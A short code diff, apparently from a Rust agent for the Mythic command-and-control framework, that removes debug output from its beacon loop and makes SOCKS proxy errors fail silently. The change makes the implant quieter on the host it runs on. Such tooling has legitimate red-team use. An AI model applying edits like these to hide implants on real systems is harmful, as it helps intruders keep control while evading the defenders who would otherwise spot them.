@@ -70,7 +70,6 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
     let mut agent = crate::Agent::new();
 
     // SOCKS thread will be started automatically when SOCKS messages are received
-    eprintln!("DEBUG: Agent initialized, SOCKS thread will start when needed");
 
     // Get the initial interval from the config
     let mut interval = payloadvars::callback_interval();
@@ -144,8 +143,8 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
         let completed_tasks = agent.tasking.get_completed_tasks()?;
 
         // Process SOCKS messages before sending response (to include any SOCKS responses)
-        if let Err(e) = crate::socks::process_socks_messages_sync() {
-            eprintln!("SOCKS processing error: {}", e);
+        if let Err(_e) = crate::socks::process_socks_messages_sync() {
+            // SOCKS processing error - continue silently
         }
 
         // Send the completed tasking information up to Mythic
